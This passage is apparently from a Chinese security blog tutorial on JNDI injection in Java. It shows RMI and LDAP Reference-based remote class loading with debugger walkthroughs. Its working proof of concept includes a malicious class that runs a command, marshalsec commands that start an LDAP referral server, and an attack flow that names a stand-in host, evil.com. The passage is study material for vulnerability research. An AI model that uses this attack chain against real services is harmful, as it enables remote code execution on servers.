+<p>原理：引用 对应着  工厂，在 引用 中写具体逻辑，感觉和<strong>代理</strong>差不多</p>
+<h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li><p>先看<code>JNDIRMIServer</code></p>
+<p>相当于用 Reference 代理了远程对象，Reference 实例化时传参是将 Reference 对象绑定到了注册中心</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Context</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Reference</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Hashtable</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDIRMIServer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Registry</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">registry</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #E5C07B">LocateRegistry</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">createRegistry</span><span style="color: #ABB2BF">(</span><span style="color: #D19A66">1099</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//      initialContext.rebind(&quot;rmi://localhost:1099/remoteObj&quot;,new RemoteObjImpl());</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Reference</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">refObj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Reference</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;TestRef&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;TestRef&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;http://localhost:7777/&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rebind</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;rmi://localhost:1099/remoteObj&quot;</span><span style="color: #ABB2BF">, refObj);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>刚刚绑定的是远程对象，现在绑定的是<code>Reference</code>（引用）</p>
+<p>可以看一下<code>Reference</code>的构造函数</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Reference</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> className</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> factory</span><span style="color: #ABB2BF">,</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">String</span><span style="color: #E06C75"> factoryLocation) {</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #E5C07B">this</span><span style="color: #E06C75">(className)</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    classFactory </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> factory</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">    classFactoryLocation </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> factoryLocation</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #E06C75">}</span></span></code></pre></div></div></figure>
+
+<ul>
+<li><p>className：类名</p>
+</li>
+<li><p>factory：工厂—————&gt;作用：为了 让存储在目录服务中的<code>Reference</code>能动态生成复杂的对象，相当于上面说的，在<code>Reference</code>中写具体逻辑</p>
+</li>
+<li><p>factoryLocation：工厂位置</p>
+</li>
+</ul>
+</li>
+<li><p>写一个测试类，在7777端口启动</p>
+<p><strong>注意：需要把 package 去掉，再进行编译，因为服务目录下是没有包目录的</strong></p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TestRef</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> TestRef</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305145008777.png" srcset="/img/loading.gif" lazyload alt="image-20260305145008739"></p>
+<p>就可以将  <code>引用</code>  绑定到<code>RMI服务</code>上面</p>
+</li>
+<li><p>启动服务端，然后再客户端在lookup一下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305150534686.png" srcset="/img/loading.gif" lazyload alt="image-20260305150534630"></p>
+</li>
+</ul>
+<p><strong>也就是说，恶意地址里面有恶意类，导致JNDI客户端查询lookup的是时候就会产生危害</strong></p>
+<h3 id="内部调试"><a href="#内部调试" class="headerlink" title="内部调试"></a>内部调试</h3><blockquote>
+<p>接下来我们看一下内部具体的流程</p>
+</blockquote>
+<ul>
+<li><p>断点还是在这</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151107431.png" srcset="/img/loading.gif" lazyload alt="image-20260305151107397"></p>
+</li>
+<li><p>按照上面的流程走到了<code>RegistryContext</code>文件</p>
+<p>看一下参数</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151441693.png" srcset="/img/loading.gif" lazyload alt="image-20260305151441656"></p>
+<p>发现从<code>Reference</code>变成了<code>ReferenceWrapper_Stub</code></p>
+<ul>
+<li><p>一开始在服务端绑定的<code>Reference</code>，到客户端就改变了</p>
+<p>所以就是<strong>服务端的操作</strong>对这个名称造成了影响</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151713089.png" srcset="/img/loading.gif" lazyload alt="image-20260305151713037"></p>
+</li>
+<li><p>还是到<code>RegistryContext</code>文件</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305151903969.png" srcset="/img/loading.gif" lazyload alt="image-20260305151903935"></p>
+<p>名字还是之前那个，但是对象发生了<code>encodeObject</code></p>
+</li>
+<li><p>进<code>encodeObject</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152032716.png" srcset="/img/loading.gif" lazyload alt="image-20260305152032679"></p>
+<p>逻辑中表示：如果对象是<code>Reference</code>，就把他变成<code>ReferenceWrapper</code></p>
+</li>
+</ul>
+</li>
+<li><p>接下来继续看到<code>decodeObject</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152323608.png" srcset="/img/loading.gif" lazyload alt="image-20260305152323568"></p>
+</li>
+<li><p>看<code>decodeObject</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305152412228.png" srcset="/img/loading.gif" lazyload alt="image-20260305152412176"></p>
+<p>意思是，如果是<code>ReferenceWrapper</code>，就获取值</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305154550091.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>接下来进到文件<code>NamingManager.java</code>这个类是一个<strong>通用的类</strong></p>
+<p>这个地方进到   工厂，从引用路径里面获取对象工厂</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155046010.png" srcset="/img/loading.gif" lazyload alt="image-20260305155045975"></p>
+</li>
+<li><p>接下来就是要通过类加载来寻找这个工厂类了</p>
+<p>按照双亲委派寻找</p>
+<p>先本地查找（appclassloader）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155409587.png" srcset="/img/loading.gif" lazyload alt="image-20260305155409553"></p>
+<p>接下来利用<code>codebase</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155437405.png" srcset="/img/loading.gif" lazyload alt="image-20260305155437374"></p>
+<p>新建<code>urlclassloader</code>把<code>codebase</code>传入</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155653132.png" srcset="/img/loading.gif" lazyload></p>
+<p>使用url路径加载工厂类</p>
+</li>
+<li><p>因为我们的TestRef使用方法触发</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.io.IOException</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">TestRef</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> TestRef</span><span style="color: #ABB2BF">()</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">IOException</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Runtime</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">getRuntime</span><span style="color: #ABB2BF">().</span><span style="color: #61AFEF">exec</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;calc&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p>所以还需要  <strong>实例化工厂类</strong>  才会弹出计算器（因为是方法需要实例化，要是静态代码块就不用）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305155802690.png" srcset="/img/loading.gif" lazyload alt="image-20260305155802639"></p>
+</li>
+</ul>
+<h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305172147034.png" srcset="/img/loading.gif" lazyload alt="image-20260305172146955"></p>
+<ul>
+<li>存在JNDI服务，且有rmi请求的地址（rmi:&#x2F;&#x2F;localhost:1099）</li>
+<li>不走rmi请求的地址，我们走自己<code>伪造的地址</code>（rmi:&#x2F;&#x2F;evil.com:1099）（2）</li>
+<li>伪造地址返回<code>引用对象</code>（3）</li>
+<li>根据<code>引用对象</code>  提供的 <code>伪造的地址</code> ，利用类加载  搜索<code>恶意.class</code>（4）</li>
+<li>返回执行<code>恶意.class</code>（5）</li>
+</ul>
+<h1 id="JDNI-结合-LDAP"><a href="#JDNI-结合-LDAP" class="headerlink" title="JDNI 结合 LDAP"></a>JDNI 结合 LDAP</h1><h2 id="JDNI-LDAP绕过"><a href="#JDNI-LDAP绕过" class="headerlink" title="JDNI +LDAP绕过"></a>JDNI +LDAP绕过</h2><p>jkd有过一次修复，加了一个参数叫做trustURLCodebase，需要手动运行调整，这个参数是true才能真正实现  从引用路径里面获取对象工厂，否则报错</p>
+<p>三个支持远程对象的服务  ：修复了<code>RMI   CORBA</code> ，只留下了<code>ldap</code></p>
+<h3 id="LDAP-介绍"><a href="#LDAP-介绍" class="headerlink" title="LDAP 介绍"></a>LDAP 介绍</h3><p><strong>LDAP</strong>（轻量级目录访问协议）专门用于存储用户信息、组织结构或网络资源。在 JNDI 的语境下，它就是一个存放“对象”的仓库。且属于目录服务，是一个特殊的数据库</p>
+<h3 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li><p>JNDILDAPServer</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">org.example</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Context</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.Reference</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">java.util.Hashtable</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDILDAPServer</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        Hashtable env = new Hashtable();</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        env.put(Context.INITIAL_CONTEXT_FACTORY,</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//                &quot;com.sun.jndi.ldap.LdapCtxFactory&quot;);</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//        env.put(Context.PROVIDER_URL,</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic">//                &quot;ldap://localhost:10389&quot;);</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">Reference</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">refObj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Reference</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;TestRef&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;TestRef&quot;</span><span style="color: #ABB2BF">, </span><span style="color: #98C379">&quot;http://localhost:7777/&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">rebind</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span><span style="color: #ABB2BF">, refObj);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+</li>
+<li><p>服务端就用一个工具起服务</p>
+<p>启动服务端成功绑定</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305204438425.png" srcset="/img/loading.gif" lazyload alt="image-20260305204438340"></p>
+<p>或者跑命令行</p>
+<figure class="shiki bash"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic"># 1. 克隆代码到本地</span></span>
+<span class="line"><span style="color: #61AFEF">git</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">clone</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">https://github.com/mbechler/marshalsec.git</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"># 2. 进入项目目录</span></span>
+<span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">marshalsec</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"># 3. 使用 Maven 编译生成可执行的 jar 包</span></span>
+<span class="line"><span style="color: #61AFEF">mvn</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">clean</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">package</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-DskipTests</span></span>
+<span class="line"><span style="color: #7F848E; font-style: italic"># 4. 开启服务</span></span>
+<span class="line"><span style="color: #56B6C2">cd</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">C:</span><span style="color: #56B6C2">\U</span><span style="color: #98C379">sers</span><span style="color: #56B6C2">\9</span><span style="color: #98C379">5227</span><span style="color: #56B6C2">\m</span><span style="color: #98C379">arshalsec</span><span style="color: #56B6C2">\t</span><span style="color: #98C379">arget</span></span>
+<span class="line"><span style="color: #61AFEF">D:\Java\jdk1.8.0_65\bin\java.exe</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">-cp</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">marshalsec-0.0.3-SNAPSHOT-all.jar</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">marshalsec.jndi.LDAPRefServer</span><span style="color: #ABB2BF"> </span><span style="color: #98C379">&quot;http://127.0.0.1:7777/#TestRef&quot;</span><span style="color: #ABB2BF"> </span><span style="color: #D19A66">10389</span></span></code></pre></div></div></figure>
+</li>
+<li><p>联通7777的Testref.class</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305205127064.png" srcset="/img/loading.gif" lazyload alt="image-20260305205127038"></p>
+</li>
+<li><p>客户端直接查</p>
+<figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">import</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">javax.naming.InitialContext</span><span style="color: #ABB2BF">;</span></span>
+<span class="line"></span>
+<span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">JNDILDAPClient</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">throws</span><span style="color: #61AFEF"> </span><span style="color: #E5C07B">Exception</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">InitialContext</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">initialContext</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">InitialContext</span><span style="color: #ABB2BF">();</span></span>
+<span class="line"><span style="color: #ABB2BF">        </span><span style="color: #E5C07B">initialContext</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">lookup</span><span style="color: #ABB2BF">(</span><span style="color: #98C379">&quot;ldap://localhost:10389/cn=test,dc=example,dc=com&quot;</span><span style="color: #ABB2BF">);</span></span>
+<span class="line"><span style="color: #ABB2BF">    }</span></span>
+<span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211539794.png" srcset="/img/loading.gif" lazyload alt="image-20260305211539751"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211554428.png" srcset="/img/loading.gif" lazyload alt="image-20260305211554284"></p>
+</li>
+</ul>
+<h3 id="内部调试-1"><a href="#内部调试-1" class="headerlink" title="内部调试"></a>内部调试</h3><ul>
+<li><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305211920755.png" srcset="/img/loading.gif" lazyload alt="image-20260305211920712"></p>
+</li>
+<li><p>和rmi一样跳到Context文件，最后走到<code>LdapCtx文件</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305212700431.png" srcset="/img/loading.gif" lazyload></p>
+</li>
+<li><p>这一步的参数<code>Attributes</code>，就是所获取要的属性</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305212858636.png" srcset="/img/loading.gif" lazyload alt="image-20260305212858590"></p>
+</li>
+<li><p>接下来解析属性</p>
+<p>（前面说过目录存储对象 可存储的 对象的类型：包含多种）</p>
+<p>由于我们用的是引用，所以到了<code>decodeReference</code>方法</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305213112371.png" srcset="/img/loading.gif" lazyload alt="image-20260305213112303"></p>
+</li>
+<li><p>进<code>decodeReference</code>方法</p>
+<p>和上面提到的rmi一样，这个方法都是为了还原<code>Reference</code>通过<code>Reference</code>来利用url查找恶意类</p>
+</li>
+<li><p>到了<code>DirectoryManager</code>（和上面rmi的<code>NamingManager</code>一样）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305213731659.png" srcset="/img/loading.gif" lazyload alt="image-20260305213731604"></p>
+</li>
+<li><p>然后类加载到恶意类</p>
+<p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20260305214451343.png" srcset="/img/loading.gif" lazyload alt="image-20260305214451297"></p>
+</li>
+<li><p>实例化触发</p>
+</li>
+</ul>
+<h2 id="JavaSerializedData-注入"><a href="#JavaSerializedData-注入" class="headerlink" title="JavaSerializedData 注入"></a>JavaSerializedData 注入</h2><p>利用 <code>InMemoryOperationInterceptor</code> 动态拦截 LDAP 请求并返回恶意数据。</p>
+<p>当客户端通过 <code>lookup</code> 拿到结果时，会自动检查 Entry（条目）里的属性名。如果属性名是 <strong><code>javaSerializedData</code></strong>,JNDI客户端会立即调用 <code>ObjectInputStream.readObject()</code>，将 序列化好的 Java 对象，通过反序列化还原</p>
+<h3 id="攻击-2"><a href="#攻击-2" class="headerlink" title="攻击"></a>攻击</h3><ul>
+<li><p><strong>导入cc链子</strong>和<strong>fastjson</strong> </p>
+<figure class="shiki xml"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;com.alibaba&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;fastjson&lt;/</span><span style="color: #E06C75">artifactId</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;1.2.80&lt;/</span><span style="color: #E06C75">version</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;/</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;</span></span>
+<span class="line"><span style="color: #ABB2BF">&lt;</span><span style="color: #E06C75">dependency</span><span style="color: #ABB2BF">&gt;  </span></span>
+<span class="line"><span style="color: #ABB2BF"> &lt;</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;commons-collections&lt;/</span><span style="color: #E06C75">groupId</span><span style="color: #ABB2BF">&gt;  </span></span>
